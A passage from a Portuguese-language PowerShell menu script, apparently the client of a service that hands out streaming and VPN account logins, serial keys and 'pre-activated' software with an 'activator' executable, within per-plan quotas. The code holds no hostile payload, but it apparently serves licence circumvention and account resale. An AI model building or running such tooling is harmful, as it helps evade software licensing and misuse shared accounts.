                                                            $pasta_instalacao = $detalhes_local_produto[1].Trim()
                                                            $pasta_ativacao = $detalhes_local_produto[2].Trim()
                                                            $exe_instalacao = $detalhes_local_produto[3].Trim()
                                                            $exe_desinstalacao = $detalhes_local_produto[4].Trim()

                                                            # Adicionar local de pastas e .exe diretamente à lista de pastas e .exe
                                                            $pathsToCheck = @{
                                                                "pasta_instalacao" = $pasta_instalacao
                                                                "pasta_ativacao" = $pasta_ativacao
                                                                "exe_instalacao" = $exe_instalacao
                                                                "exe_desinstalacao" = $exe_desinstalacao
                                                            }

                                                            break
        
                                                            # Verifica se a localização do .exe e pasta foi definido antes de adicionar à lista
                                                            if ($pathsToCheck) {
                                                                break
                                                            }
                                                        }

                                                        foreach ($instrucao_usoativacao_produto in $instrucoes_usoativacao_produto) {

                                                            $detalhes_instrucao_usoativacao_produto = $instrucao_usoativacao_produto -split ":"

                                                            $processo_ativacao = $detalhes_instrucao_usoativacao_produto[0].Trim()

                                                            $stepsAtvToCheck = @{
                                                                "processo_ativacao" = $processo_ativacao
                                                            }

                                                            break

                                                            if ($stepsAtvToCheck) {
                                                                break
                                                            }

                                                        }

                                                        if ($linksProductToCheck["link_ativacao_produto"] -eq "Nenhum") {

                                                            # Converter o array em uma string separada por nova linha, se desejado
                                                            $produtoctdigital_usuariodisplay = "$resultado_dadosusuario"
                                                            $produtoctdigital_senhadisplay = "$produtoctdigital_senhaassinatura"
                                                            $produtoctdigital_telapinlockdisplay = "$produtoctdigital_telapinlock"
                                                            $produtoctdigital_chavekeysdisplay = "$resultado_chavekeys"

                                                            # Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -EtapaProcesso "Visualizacao"
                                                    
                                                            # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                            # ContagemRegressiva -segundos 15 -etapa "VISUALIZAÇÃO" -nome_produto $ProdutoSelecionado

                                                            $individualValues = $qtdvValuesAtualizado.Individual
                                                            $totalValues = $qtdvValuesAtualizado.Total

                                                            Update-QTDVIndividualMenu -qtdvIndividualTotal $($individualValues.qtdv_valor_atual) -silent
                                                            Update-QTDVInMenu -qtdvTotal $($totalValues.qtdv_valor_atual) -qtdvUtilizado $($totalValues.qtdv_valor_utilizado) -silent

                                                            # Mostra os dados reais apenas se a opção 1 for selecionada
                                                            $mostrarDadosReais = $true
                                                            ExibirMenuProduto -produtoctdigital_usuariodisplay $produtoctdigital_usuariodisplay -produtoctdigital_senhadisplay $produtoctdigital_senhadisplay -produtoctdigital_chavekeysdisplay $produtoctdigital_chavekeysdisplay -revelarDadosAcessoColor Green

                                                            # Contagem regressiva de 5 segundos antes de ocultar os dados
                                                            ContagemRegressiva -segundos 15

                                                            $mostrarDadosReais = $false
                                                            ExibirMenuProduto -produtoctdigital_usuariodisplay "xxxx-xxxx-xxxx" -produtoctdigital_senhadisplay "xxxx-xxxx-xxxx" -produtoctdigital_chavekeysdisplay "xxxx-xxxx-xxxx"
                                                            
                                                        } else {
                                                            
                                                            # Local aonde se encontra o ativador
                                                            $destino_atv = $($pathsToCheck["exe_instalacao"]) 
                                                            $pasta_program = $($pathsToCheck["pasta_instalacao"]) 
                                                            $pasta_atv_program = $($pathsToCheck["pasta_ativacao"]) 
                                                            $processo_ativacao_program = $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')

                                                            # Criar o diretório de pasta_atv_program se não existir
                		                                    if (-not (Test-Path $pasta_program) -and -not (Test-Path $pasta_atv_program)) {
                                                                New-Item -ItemType Directory -Path $pasta_program | Out-Null
                    			                                New-Item -ItemType Directory -Path $pasta_atv_program | Out-Null
                	                                        }

                                                            # Verifica se o diretório existe e se contém arquivos ou subpastas
                                                            $pasta_program_not_empty = (Test-Path $pasta_program) -and (Get-ChildItem $pasta_program | Where-Object { $_ } )
                                                            $pasta_atv_program_not_empty = (Test-Path $pasta_atv_program) -and (Get-ChildItem $pasta_atv_program | Where-Object { $_ } )
                                                                
                                                            # Obter o nome do arquivo sem a extensão e concatenar diretamente na variável
                                                            $nome_arquivo_atv = "prompt" + ([System.IO.Path]::GetFileNameWithoutExtension($destino_atv)).Replace(" ","") + ".exe"
                                                            $nome_processo_atv = "prompt" + ([System.IO.Path]::GetFileNameWithoutExtension($destino_atv)).Replace(" ", "")
                                                                
                                                            # Verificar se o arquivo existe no diretório
                                                            $file_arquivo_atv = Get-ChildItem -Path $pasta_atv_program -Filter $nome_arquivo_atv -File | Select-Object -First 1

                                                            # Verifica se o processo está em execução
                                                            $processo_atv = Get-Process -Name $nome_processo_atv -ErrorAction SilentlyContinue 
                                                                
                                                            if (($pasta_program_not_empty -and $pasta_atv_program_not_empty) -and ($file_arquivo_atv -or $processo_atv)) {

                                                                # Converter o array em uma string separada por nova linha, se desejado
                                                                $produtoctdigital_usuariodisplay = "$resultado_dadosusuario"
                                                                $produtoctdigital_senhadisplay = "$produtoctdigital_senhaassinatura"
                                                                $produtoctdigital_telapinlockdisplay = "$produtoctdigital_telapinlock"
                                                                $produtoctdigital_chavekeysdisplay = "$resultado_chavekeys"
                                                   
                                                            } else {
                                                                    
                                                                if ((Test-Path $pasta_program) -and (Test-Path $pasta_atv_program)) { Remove-Item $pasta_program -Recurse -Force ; Remove-Item $pasta_atv_program -Recurse -Force }

                                                                # Converter o array em uma string separada por nova linha, se desejado
                                                                $produtoctdigital_usuariodisplay = "$resultado_dadosusuario"
                                                                $produtoctdigital_senhadisplay = "$produtoctdigital_senhaassinatura"
                                                                $produtoctdigital_telapinlockdisplay = "$produtoctdigital_telapinlock"
                                                                $produtoctdigital_chavekeysdisplay = "$resultado_chavekeys"

                                                                Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Visualizacao"
                                                    
                                                                # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                                ContagemRegressiva -segundos 15 -etapa "VISUALIZAÇÃO" -nome_produto $ProdutoSelecionado

                                                            }        
                                                                                                                                                             
                                                            if (($pasta_program_not_empty -and $pasta_atv_program_not_empty) -or ($processo_ativacao_program -and $pasta_atv_program_not_empty)) {

                                                                $individualValues = $qtdvValuesAtualizado.Individual
                                                                $totalValues = $qtdvValuesAtualizado.Total

                                                                Update-QTDVIndividualMenu -qtdvIndividualTotal $($individualValues.qtdv_valor_atual) -silent
                                                                Update-QTDVInMenu -qtdvTotal $($totalValues.qtdv_valor_atual) -qtdvUtilizado $($totalValues.qtdv_valor_utilizado) -silent
                                                           
                                                                # Mostra os dados reais apenas se a opção 1 for selecionada
                                                                $mostrarDadosReais = $true
                                                                ExibirMenuProduto -produtoctdigital_usuariodisplay $produtoctdigital_usuariodisplay -produtoctdigital_senhadisplay $produtoctdigital_senhadisplay -produtoctdigital_chavekeysdisplay $produtoctdigital_chavekeysdisplay -revelarDadosAcessoColor Green

                                                                # Contagem regressiva de 5 segundos antes de ocultar os dados
                                                                ContagemRegressiva -segundos 15

                                                                $mostrarDadosReais = $false
                                                                ExibirMenuProduto -produtoctdigital_usuariodisplay "xxxx-xxxx-xxxx" -produtoctdigital_senhadisplay "xxxx-xxxx-xxxx" -produtoctdigital_chavekeysdisplay "xxxx-xxxx-xxxx"

                                                            } else {

                                                                $individualValues = $qtdvValuesAtualizado.Individual
                                                                $totalValues = $qtdvValuesAtualizado.Total

                                                                Update-QTDVIndividualMenu -qtdvIndividualTotal $($individualValues.qtdv_valor_atual) -silent
                                                                Update-QTDVInMenu -qtdvTotal $($totalValues.qtdv_valor_atual) -qtdvUtilizado $($totalValues.qtdv_valor_utilizado) -silent
                                                                
                                                                $mostrarDadosReais = $false
                                                                ExibirMenuProduto -produtoctdigital_usuariodisplay "xxxx-xxxx-xxxx" -produtoctdigital_senhadisplay "xxxx-xxxx-xxxx" -produtoctdigital_chavekeysdisplay "xxxx-xxxx-xxxx"

                                                            }

                                                        }
                    
                                                    } else {
                                                    
                                                        Write-Host ""
                                                        Write-Host "Você não tem mais QTD Download e Visualizações, disponível para seu $ProdutoSelecionado" -ForegroundColor Red
                                                        Write-Host ""
                                                        Start-Sleep -Seconds 5

                                                        ExibirMenuProduto
                                                    }

                                                }

                                            } elseif ($MetodoSelecionado -eq "Pré-Ativado") {
                                                
                                                # Pré-Ativado instalar e ativar

                                                if ($TipoPlanoConta -eq "VIP") {
                                                    
                                                    Write-Host ""
                                                    Write-Host -NoNewline "Iniciando a" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '" -ForegroundColor Yellow 
                                                    Write-Host -NoNewline "ETAPA DE" -ForegroundColor Yellow 
                                                    Write-Host -NoNewline " INSTALAÇÃO" -ForegroundColor Green 
                                                    Write-Host -NoNewline " E" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " ATIVAÇÃO" -ForegroundColor Magenta 
                                                    Write-Host -NoNewline "' " -ForegroundColor Yellow
                                                    Write-Host -NoNewline "do" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '$ProdutoSelecionado'." -ForegroundColor Cyan
                                                    Write-Host ""
                                                    Write-Host -NoNewline "Aguarde" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '5 segundos' " -ForegroundColor Green
                                                    Write-Host -NoNewline "para dar início ao procedimento..." -ForegroundColor Yellow
                                                    Write-Host ""  
                                                    
                                                    Start-Sleep -Seconds 5

                                                    Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Instalacao/Ativação"
                                                    
                                                    # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                    ContagemRegressiva -segundos 15 -etapa "INSTALAÇAO E ATIVAÇÃO" -nome_produto $ProdutoSelecionado

                                                    ExibirMenuProduto

                                                } else {

                                                    $qtdvValuesAtualizado = QTDV-Individual-Select-MenuOption -option "1" -qtdvIndividualValues $qtdvIndividualValues

                                                    if ($qtdvValuesAtualizado) {

                                                        $individualValues = $qtdvValuesAtualizado.Individual
                                                        $totalValues = $qtdvValuesAtualizado.Total

                                                        Update-QTDVIndividualMenu -qtdvIndividualTotal $($individualValues.qtdv_valor_atual) -silent 
                                                        Update-QTDVInMenu -qtdvTotal $($totalValues.qtdv_valor_atual) -qtdvUtilizado $($totalValues.qtdv_valor_utilizado) -silent
                                                        
                                                        Write-Host ""
                                                        Write-Host -NoNewline "Iniciando a" -ForegroundColor Yellow
                                                        Write-Host -NoNewline " '" -ForegroundColor Yellow 
                                                        Write-Host -NoNewline "ETAPA DE" -ForegroundColor Yellow 
                                                        Write-Host -NoNewline " INSTALAÇÃO" -ForegroundColor Green 
                                                        Write-Host -NoNewline " E" -ForegroundColor Yellow
                                                        Write-Host -NoNewline " ATIVAÇÃO" -ForegroundColor Magenta 
                                                        Write-Host -NoNewline "' " -ForegroundColor Yellow
                                                        Write-Host -NoNewline "do" -ForegroundColor Yellow
                                                        Write-Host -NoNewline " '$ProdutoSelecionado'." -ForegroundColor Cyan
                                                        Write-Host ""
                                                        Write-Host -NoNewline "Aguarde" -ForegroundColor Yellow
                                                        Write-Host -NoNewline " '5 segundos' " -ForegroundColor Green
                                                        Write-Host -NoNewline "para dar início ao procedimento..." -ForegroundColor Yellow
                                                        Write-Host "" 
                                                        
                                                        Start-Sleep -Seconds 5 

                                                        Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Instalacao/Ativação"
                                                    
                                                        # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                        ContagemRegressiva -segundos 15 -etapa "INSTALAÇAO E ATIVAÇÃO" -nome_produto $ProdutoSelecionado

                                                        ExibirMenuProduto
                    
                                                    } else {
                                                    
                                                        Write-Host ""
                                                        Write-Host "Você não tem mais QTD Download e Visualizações, disponível para seu $ProdutoSelecionado" -ForegroundColor Red
                                                        Write-Host ""

                                                        Start-Sleep -Seconds 5

                                                        ExibirMenuProduto
                                                    }

                                                }

                                            } else {
                                                
                                                Write-Host ""
                                                Write-Host "O $ProdutoSelecionado não possui dados de acesso." -ForegroundColor Red
                                                Write-Host ""

                                                Start-Sleep -Seconds 5

                                                ExibirMenuProduto
                                            }


                                        } elseif ($opcao_produto_softwarelicenca_chaveserial -match '^\d+$' -or $opcao_produto_softwarelicenca_scriptmodding -match '^\d+$' -and $opcao_produto_softwarelicenca_chaveserial -eq "2" -or $opcao_produto_softwarelicenca_scriptmodding -eq "2") {
                                            
                                            # instalação de chaveserial, Pré-Ativado

                                            if ($MetodoSelecionado -eq "Chave/Serial") {
                                                    
                                                Write-Host ""
                                                Write-Host -NoNewline "Iniciando a" -ForegroundColor Yellow
                                                Write-Host -NoNewline " 'ETAPA DE INSTALAÇÃO' " -ForegroundColor Green
                                                Write-Host -NoNewline "do" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '$ProdutoSelecionado'. " -ForegroundColor Cyan
                                                Write-Host ""
                                                Write-Host -NoNewline "Aguarde" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '5 segundos' " -ForegroundColor Green
                                                Write-Host -NoNewline "para dar início ao procedimento..." -ForegroundColor Yellow
                                                Write-Host ""

                                                Start-Sleep -Seconds 5

                                                Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Instalacao"
                                                    
                                                # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                ContagemRegressiva -segundos 15 -etapa "INSTALAÇAO" -nome_produto $ProdutoSelecionado

                                                ExibirMenuProduto

                                            } elseif ($MetodoSelecionado -eq "Pré-Ativado") {

                                                Write-Host ""
                                                Write-Host -NoNewline "Iniciando a" -ForegroundColor Yellow
                                                Write-Host -NoNewline " 'ETAPA DE INSTALAÇÃO' " -ForegroundColor Green
                                                Write-Host -NoNewline "do" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '$ProdutoSelecionado'. " -ForegroundColor Cyan
                                                Write-Host ""
                                                Write-Host -NoNewline "Aguarde" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '5 segundos' " -ForegroundColor Green
                                                Write-Host -NoNewline "para dar início ao procedimento..." -ForegroundColor Yellow
                                                Write-Host "" 

                                                Start-Sleep -Seconds 5
                                                
                                                Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Instalacao"
                                                    
                                                # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                ContagemRegressiva -segundos 15 -etapa "INSTALAÇAO" -nome_produto $ProdutoSelecionado

                                                ExibirMenuProduto

                                            } else {

                                                Write-Host ""
                                                Write-Host "O $ProdutoSelecionado não possui dados de acesso." -ForegroundColor Red
                                                Write-Host ""
                                                Start-Sleep -Seconds 5

                                                ExibirMenuProduto
                                            }

                                        } elseif ($opcao_produto_softwarelicenca_scriptmodding -match '^\d+$' -and $opcao_produto_softwarelicenca_scriptmodding -eq "3") {
                                            
                                            # ativação Pré-Ativado

                                            if ($TipoPlanoConta -eq "VIP") {
                                                
                                                Write-Host ""
                                                Write-Host -NoNewline "Iniciando a" -ForegroundColor Yellow
                                                Write-Host -NoNewline " 'ETAPA DE ATIVAÇÃO' " -ForegroundColor Magenta 
                                                Write-Host -NoNewline "do" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '$ProdutoSelecionado'. " -ForegroundColor Cyan
                                                Write-Host ""
                                                Write-Host -NoNewline "Aguarde" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '5 segundos' " -ForegroundColor Green
                                                Write-Host -NoNewline "para dar início ao procedimento..." -ForegroundColor Yellow
                                                Write-Host "" 

                                                Start-Sleep -Seconds 5

                                                Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Ativacao"
                                                    
                                                # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                ContagemRegressiva -segundos 15 -etapa "ATIVAÇÃO" -nome_produto $ProdutoSelecionado

                                                ExibirMenuProduto
                                            
                                            } else {

                                                $qtdvValuesAtualizado = QTDV-Individual-Select-MenuOption -option "3" -qtdvIndividualValues $qtdvIndividualValues
                                                
                                                if ($qtdvValuesAtualizado) {
                                                    
                                                    $individualValues = $qtdvValuesAtualizado.Individual
                                                    $totalValues = $qtdvValuesAtualizado.Total

                                                    Update-QTDVIndividualMenu -qtdvIndividualTotal $($individualValues.qtdv_valor_atual) -silent
                                                    Update-QTDVInMenu -qtdvTotal $($totalValues.qtdv_valor_atual) -qtdvUtilizado $($totalValues.qtdv_valor_utilizado) -silent
                                                    
                                                    Write-Host ""
                                                    Write-Host -NoNewline "Iniciando a" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " 'ETAPA DE ATIVAÇÃO' " -ForegroundColor Magenta 
                                                    Write-Host -NoNewline "do" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '$ProdutoSelecionado'. " -ForegroundColor Cyan
                                                    Write-Host ""
                                                    Write-Host -NoNewline "Aguarde" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '5 segundos' " -ForegroundColor Green
                                                    Write-Host -NoNewline "para dar início ao procedimento..." -ForegroundColor Yellow
                                                    Write-Host "" 

                                                    Start-Sleep -Seconds 5

                                                    Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Ativacao"

                                                    # Contagem regressiva de 5 segundos antes de ocultar os dados
                                                    ContagemRegressiva -segundos 15 -etapa "ATIVAÇÃO" -nome_produto $ProdutoSelecionado

                                                    ExibirMenuProduto

                                                } else {

                                                    Write-Host ""
                                                    Write-Host "Você não tem mais QTD Download e Visualizações, disponível para seu $ProdutoSelecionado" -ForegroundColor Red
                                                    Write-Host ""

                                                    Start-Sleep -Seconds 5

                                                    ExibirMenuProduto
                                                }

                                            }

                                        } elseif ($opcao_produto_softwarelicenca_chaveserial -match '^\d+$' -or $opcao_produto_softwarelicenca_scriptmodding -match '^\d+$' -and $opcao_produto_softwarelicenca_chaveserial -eq "3" -or $opcao_produto_softwarelicenca_scriptmodding -eq "4") {
                                            
                                            # desinstalação chave/serial e Pré-Ativado

                                            if ($MetodoSelecionado -eq "Chave/Serial") {
                                                
                                                Write-Host ""
                                                Write-Host -NoNewline "Iniciando a" -ForegroundColor Yellow
                                                Write-Host -NoNewline " 'ETAPA DE DESINSTALAÇÃO' " -ForegroundColor Red
                                                Write-Host -NoNewline "do" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '$ProdutoSelecionado'. " -ForegroundColor Cyan
                                                Write-Host ""
                                                Write-Host -NoNewline "Aguarde" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '5 segundos' " -ForegroundColor Green
                                                Write-Host -NoNewline "para dar início ao procedimento..." -ForegroundColor Yellow
                                                Write-Host "" 

                                                Start-Sleep -Seconds 5

                                                Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Desinstalacao"
                                                    
                                                # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                ContagemRegressiva -segundos 15 -etapa "DESINSTALAÇÃO" -nome_produto $ProdutoSelecionado

                                                ExibirMenuProduto

                                            } elseif ($MetodoSelecionado -eq "Pré-Ativado") {
                                                
                                                Write-Host ""
                                                Write-Host -NoNewline "Iniciando a" -ForegroundColor Yellow
                                                Write-Host -NoNewline " 'ETAPA DE DESINSTALAÇÃO' " -ForegroundColor Red
                                                Write-Host -NoNewline "do" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '$ProdutoSelecionado'. " -ForegroundColor Cyan
                                                Write-Host ""
                                                Write-Host -NoNewline "Aguarde" -ForegroundColor Yellow
                                                Write-Host -NoNewline " '5 segundos' " -ForegroundColor Green
                                                Write-Host -NoNewline "para dar início ao procedimento..." -ForegroundColor Yellow
                                                Write-Host "" 

                                                Start-Sleep -Seconds 5

                                                Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Desinstalacao"
                                                    
                                                # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                ContagemRegressiva -segundos 15 -etapa "DESINSTALAÇÃO" -nome_produto $ProdutoSelecionado

                                                ExibirMenuProduto

                                            } else {

                                                Write-Host ""
                                                Write-Host "O $ProdutoSelecionado não possui dados de acesso." -ForegroundColor Red
                                                Write-Host ""
                                                Start-Sleep -Seconds 5

                                                ExibirMenuProduto
                                            }

                                        } elseif ($opcao_produto_streamingvpns -match '^\d+$' -or $opcao_produto_softwarelicenca_contadigital -match '^\d+$' -and $opcao_produto_streamingvpns -eq "2" -or $opcao_produto_softwarelicenca_contadigital -eq "4") {

                                            $urlPattern = '^(https?|ftp)://[^\s/$.?#].[^\s]*$'

                                            if ($produtoctdigital_link_codigoativacao -match $urlPattern) {
                                                Start-Process $produtoctdigital_link_codigoativacao
                                                ExibirMenuProduto
                                            } else {
                                                Write-Host ""
                                                Write-Host "O $ProdutoSelecionado não possui um link de código de ativação." -ForegroundColor Red
                                                Write-Host ""
                                                Start-Sleep -Seconds 5

                                                ExibirMenuProduto
                                            }

                                        } elseif ($opcao_produto_streamingvpns -match '^\d+$' -or $opcao_produto_softwarelicenca_contadigital -match '^\d+$' -and $opcao_produto_streamingvpns -eq "3" -or $opcao_produto_softwarelicenca_contadigital -eq "5") {

                                            $urlPattern = '^(https?|ftp)://[^\s/$.?#].[^\s]*$'

                                            if ($produtoctdigital_link_acessoplataforma -match $urlPattern) {
                                                Start-Process $produtoctdigital_link_acessoplataforma
                                                ExibirMenuProduto
                                            } else {
                                                
                                                Write-Host ""
                                                Write-Host "O $ProdutoSelecionado não possui um link de acesso ao login de sua conta." -ForegroundColor Red
                                                Write-Host ""
                                                Start-Sleep -Seconds 5

                                                ExibirMenuProduto
                                            }

                                        } elseif ($opcao_produto_streamingvpns -match '^\d+$' -or $opcao_produto_softwarelicenca_contadigital -match '^\d+$' -or $opcao_produto_softwarelicenca_chaveserial -match '^\d+$' -or $opcao_produto_softwarelicenca_scriptmodding -match '^\d+$' -and $opcao_produto_streamingvpns -eq "4" -or $opcao_produto_softwarelicenca_contadigital -eq "6" -or $opcao_produto_softwarelicenca_chaveserial -eq "4" -or $opcao_produto_softwarelicenca_scriptmodding -eq "5") {

                                            $urlPattern = '^(https?|ftp)://[^\s/$.?#].[^\s]*$'

                                            if ($MetodoSelecionado -eq "Conta Digital" -or $MetodoSelecionado -eq "Chave/Serial" -or 
                                            $MetodoSelecionado -eq "Pré-Ativado" -and $CategoriaEscolhida -eq "Softwares e Licenças") {
                                                
                                                if ($produtoctdigital_link_tutorial_ativacao -match $urlPattern) {
                                                    Start-Process $produtoctdigital_link_tutorial_ativacao
                                                    ExibirMenuProduto
                                                } else {
                                                    Write-Host ""
                                                    Write-Host "O $ProdutoSelecionado não possui um link de tutorial de ativação do seu produto." -ForegroundColor Red
                                                    Write-Host ""
                                                    Start-Sleep -Seconds 5

                                                    ExibirMenuProduto
                                                }

                                            } else {

                                                if ($produtoctdigital_link_tutorial_assinatura -match $urlPattern) {
                                                    Start-Process $produtoctdigital_link_tutorial_assinatura
                                                    ExibirMenuProduto
                                                } else {
                                                    Write-Host ""
                                                    Write-Host "O $ProdutoSelecionado não possui um link de tutorial de utilização de conta." -ForegroundColor Red
                                                    Write-Host ""
                                                    Start-Sleep -Seconds 5

                                                    ExibirMenuProduto
                                                }

                                            }

                                        } elseif ($opcao_produto_streamingvpns -match '^\d+$' -or $opcao_produto_softwarelicenca_contadigital -match '^\d+$' -or $opcao_produto_softwarelicenca_chaveserial -match '^\d+$' -or $opcao_produto_softwarelicenca_scriptmodding -match '^\d+$' -and $opcao_produto_streamingvpns -eq "5" -or $opcao_produto_softwarelicenca_contadigital -eq "7" -or $opcao_produto_softwarelicenca_chaveserial -eq "5" -or $opcao_produto_softwarelicenca_scriptmodding -eq "6") {

                                            $urlPattern = '^(https?|ftp)://[^\s/$.?#].[^\s]*$'

                                            if ($produtoctdigital_link_imagemprintconta -match $urlPattern) {
                                                Start-Process $produtoctdigital_link_imagemprintconta
                                                ExibirMenuProduto
                                            } else {
                                                Write-Host ""
                                                Write-Host "O $ProdutoSelecionado não possui um link de print verificação de sua conta." -ForegroundColor Red
                                                Write-Host ""
                                                Start-Sleep -Seconds 5

                                                ExibirMenuProduto
                                            }

                                        } elseif ($opcoes_default_menu -contains "D" -or $opcoes_default_menu -eq "D") {
                                            Fazer-Login
                                        } elseif ($opcoes_default_menu -contains "V" -or $opcoes_default_menu -eq "V") {
                                            Show-Produtos-Metodos -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $produtoSelecionado -TipoPlanoConta $TipoPlanoConta -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado
                                        } elseif ($opcoes_default_menu -contains "M" -or $opcoes_default_menu -eq "M") {
                                            Show-Menu
                                        } else {
                                            
                                            Write-Host ""
                                            Write-Host "Opção inválida. Por favor, digite um número ou letra que seja válido." -ForegroundColor Red
                                            Write-Host ""
                                            Start-Sleep -Seconds 3

                                            ExibirMenuProduto

                                            # Se nenhuma opção válida for selecionada, mostra o menu atual novamente
                                            # Show-Produtos-Metodos -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -ProdutoSelecionado $produtoSelecionado
                                        }

                                    }

                                } else {
                                    Write-Host ""
                                    Write-Host "     Condição não atendida. Verifique os valores de 'tempo_espera_entrega' e 'status_disponibilidade_entrega'."
                                    Write-Host ""

                                }

                            }

                        }  
                    } else {
                        Write-Host "O produto dessa categoria não disponível em sua conta!" -ForegroundColor Red
                        Write-Host ""

                        Start-Sleep -Seconds 3
                        Show-Produtos-Metodos -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $produtoSelecionado -TipoPlanoConta $TipoPlanoConta -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado
                    }
                } else {
                    Write-Host "     Usuário não encontrado." -ForegroundColor Red
                    Write-Host "" 

                    Start-Sleep -Seconds 3
                    exit
                }

                # Aqui você pode adicionar a lógica para lidar com a opção selecionada
                # pause

    } while ($true)
}


function Show-Process-Produto {

    param(
        [string]$UsuarioAtual,
        [string]$ProdutoSelecionado,
